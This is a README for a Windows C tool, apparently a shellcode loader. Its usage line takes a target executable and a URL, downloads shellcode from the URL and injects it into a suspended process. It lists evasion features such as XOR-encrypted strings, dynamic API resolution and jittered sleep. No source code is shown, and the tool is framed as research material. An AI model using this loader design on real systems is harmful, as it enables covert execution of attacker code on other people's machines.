# Supremacy

Supremacy is a Windows C project that demonstrates advanced process injection techniques using dynamic API resolution, memory section mapping, and encrypted string handling. The code is intended for educational and research purposes only.

## Features

- Dynamic API resolving with XOR-encrypted strings
- Download and injection of shellcode into a suspended process
- Use of NT APIs for stealthy memory operations
- Jittered sleep to obfuscate execution timing
- XOR-based runtime string decryption

## Usage

```shell
supremacy.exe <path_to_exe> <shellcode_url>
```

- `<path_to_exe>`: The path to the target executable to inject into (e.g., `C:\Windows\System32\notepad.exe`).
- `<shellcode_url>`: The HTTP/HTTPS URL from which the shellcode payload will be downloaded.

## Build

This project is intended to be built with a Windows-targeting C compiler (such as MSVC). Make sure you link against the required libraries: `kernel32.lib`, `ntdll.lib`, `wininet.lib`, etc.

## Disclaimer

This repository is for educational and authorized security research purposes only. Do **not** use this code in unauthorized environments or for malicious purposes. The author assumes **no responsibility** for misuse or damage caused.

## License

[MIT License](LICENSE)
